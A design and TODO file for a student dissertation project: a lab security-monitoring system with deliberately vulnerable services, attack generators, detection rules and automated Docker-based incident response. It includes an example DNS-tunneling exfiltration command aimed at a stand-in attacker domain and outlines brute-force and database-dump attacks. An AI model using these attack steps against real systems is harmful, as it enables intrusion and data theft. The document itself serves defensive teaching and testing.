# Future Enhancements & TODOs

This file tracks potential features and enhancements that can be added to the SOC system to increase its detection capabilities and visual impact, particularly for the dissertation presentation.

## 1. ~~Expand Enrichment Module~~

### A. ~~Upgrade GeoIP Enrichment (City & ASN)~~
Currently, the system uses the `GeoLite2-Country` database. Upgrading to the free `GeoLite2-City` and `GeoLite2-ASN` databases would provide significantly richer context:
- **Coordinates:** Extract `latitude` and `longitude`. This is critical for Kibana, as it allows plotting attacks on a live, interactive map dashboard.
- **ASN (Autonomous System Number):** Extract `isp_name` or `organization` (e.g., "DigitalOcean", "Amazon AWS", "Comcast"). This helps analysts determine if an attack is originating from a rented VPS (hosting provider) or a compromised home router (residential ISP).

### B. ~~Expand Threat Intelligence (Structured Data)~~
Currently, `threat_intel.txt` is a flat list of malicious IPs. Converting this to a structured format like CSV or JSON (e.g., `ip, threat_type, confidence_score`) would allow the Enricher to add:
- **`threat_type`:** Categorize the IP (e.g., "Tor Exit Node", "Known Scanner", "Botnet", "Malware C2").
- **`threat_confidence`:** A score from 1-100 indicating the reliability of the intelligence.
- *Impact:* Detection rules could be modified to trigger faster (lower thresholds) if the `threat_confidence` is high.

### C. ~~Implement "First Seen" Tracking (Behavioral Enrichment)~~
Utilize the existing `StateStore` (which currently tracks failed logins) to track the first time an IP interacts with the network.
- **`is_new_ip`:** Add a boolean flag (True/False) to the enriched event.
- *Impact:* Attacks frequently originate from newly spun-up infrastructure. Flagging an IP as "new" provides a powerful behavioral indicator that can be combined with other rules or the ML model to increase the overall anomaly score.

## 2. Expand Monitored Services & Attack Vectors

To demonstrate the versatility of the SOC (specifically its ability to monitor an entire network, not just web traffic), we can deploy additional vulnerable services to the `monitored_net` and create corresponding attack generators.

### A. ~~SSH Server (Remote Access)~~
- **Service:** A lightweight Ubuntu/Alpine container running `sshd` exposed on port 22.
- **Attack:** **SSH Brute Force** (using a Python script with `paramiko` to attempt rapid logins).
- **SOC Behavior:** Packetbeat natively sniffs port 22 TCP flows. The Detection Engine will use a stateful rule to track failed TCP connections per IP. If the threshold is crossed, it generates an "SSH Brute Force" alert. The ML model will also flag the massive spike in non-HTTP request counts.

### B. ~~Database Server (Lateral Movement / Exfiltration)~~
- **Service:** The official `mysql:latest` or `postgres` Docker container exposed on port 3306/5432.
- **Attacks:** 
  1. **Database Brute Force:** Guessing the `root` password.
  2. **Data Exfiltration:** An attacker successfully connects and runs massive queries (e.g., `SELECT * FROM users;`).
- **SOC Behavior:** Packetbeat natively parses MySQL/PostgreSQL wire protocols. The Detection Engine will use stateless rules to look for suspicious query strings (like `mysqldump`). The ML model will flag data exfiltration due to a massive, sudden spike in `avg_payload_size` (the DB response).

### C. ~~DNS Server (Covert Channels)~~
- **Service:** A simple `bind9` or `coredns` container exposed on port 53 (UDP).
- **Attack:** **DNS Tunneling / Exfiltration** (encoding stolen data inside DNS queries, e.g., `nslookup secret-data-123.attacker.com`).
- **SOC Behavior:** Packetbeat parses DNS requests. The Detection Engine will use stateless rules to flag unusually long DNS query strings. The ML model will flag the high `variance_score` (since every query contains unique exfiltrated data).

## 3. Automated Incident Response (IR) Service

To complete the "Detection -> Response" lifecycle, we can build a dedicated Incident Response microservice. Since containerized environments are isolated, this service will use Docker-native response strategies.

### Architecture Integration
- **Directory:** Create a new directory at `app/response/`.
- **The Service:** A Python script (`incident_responder.py`) running in its own Docker container.
- **Docker Compose Setup (`docker-compose.response.yaml`):** To give the Python script the ability to execute both strategies, the container requires specific privileges and volume mounts:
  - **Volume 1 (`/var/run/docker.sock:/var/run/docker.sock`):** This mounts the host's Docker socket into the IR container. This is strictly required for Strategy 2 (and optionally Strategy 1), as it allows the Python script (using the `docker` pip library) to issue commands like `docker network disconnect` or `docker exec` to other containers.
  - **Volume 2 (`./shared_nginx_config:/etc/nginx/conf.d/shared`):** A shared volume between the IR container and the Nginx container. This allows the Python script to write to a `blocklist.conf` file that Nginx can read (required for Strategy 1).
- **The Flow:**
  1. It connects to Kafka and continuously listens to the `alerts.signatures` and `alerts.anomalies` topics.
  2. It parses incoming alerts and extracts the attacker's IP, the targeted service, and the severity.
  3. It uses a **Decision Engine** to determine the correct action (e.g., "If severity is HIGH and rule is 'SQL Injection', apply Nginx Block. If rule is 'Data Exfiltration', apply Docker Network Disconnect").

### Strategy 1: Application-Layer Block (Nginx Dynamic Deny)
Instead of dropping packets at the firewall level, we block the attacker directly at the web proxy. This is highly realistic for automated WAF (Web Application Firewall) responses.
- **How it works:**
  1. The IR container and the Nginx container share a Docker Volume (e.g., `./shared_config:/etc/nginx/conf.d/shared`).
  2. The IR service appends `deny <attacker_ip>;` to a `blocklist.conf` file in that shared volume.
  3. The IR service issues a reload command to Nginx so it immediately applies the new blocklist. (This can be done by mounting the Docker socket and running `docker exec nginx nginx -s reload` from the IR script).

### Strategy 2: Containment Layer (Docker Socket Manipulation)
If an alert indicates that a container itself is compromised (e.g., a reverse shell is detected, or the database is actively being dumped), blocking the attacker's IP might not be enough. The victim container must be quarantined.
- **How it works:**
  1. The IR container mounts the host's Docker socket (`/var/run/docker.sock`), giving it API control over the Docker daemon.
  2. When a "Critical" alert fires (like Data Exfiltration), the IR service uses the `docker` Python library to isolate the targeted container.
  3. It executes a network disconnect (e.g., `docker network disconnect monitored_net vulnerable_api`), literally unplugging the virtual network cable while keeping the container running for forensic analysis, or it can `docker pause` the container to freeze it in memory.

### Dynamic Playbook Execution (Applying Both Strategies)

A mature SOC does not rely on a single response action. The Python Incident Response service can dynamically choose which strategy to apply (or apply both simultaneously) based on the specific alert received.

- **The Flow:** The `incident_responder.py` script acts as a central decision engine. When an alert arrives from Kafka, it checks the `rule_name` and `severity`:
  - **Scenario A (External Attack):** If the alert is an "SSH Brute Force" or "SQL Injection", the script executes **Strategy 1 only**. It adds the attacker's IP to the Nginx blocklist to stop the external threat, leaving the internal container running normally for legitimate users.
  - **Scenario B (Compromised Asset):** If the alert is "Data Exfiltration" (e.g., the ML model detects massive outbound data from the database), blocking the external IP isn't enough—the attacker might have multiple IPs or a persistent backdoor. The script executes **Strategy 2 only**. It uses the Docker API to disconnect the database container from the network, quarantining the asset.
  - **Scenario C (Critical Breach):** If an alert indicates a severe, active breach (e.g., "Successful Login After Brute Force"), the script executes **both strategies simultaneously**. It blocks the attacker's IP at Nginx (protecting the front door) AND isolates the targeted container (protecting internal assets and severing existing connections).
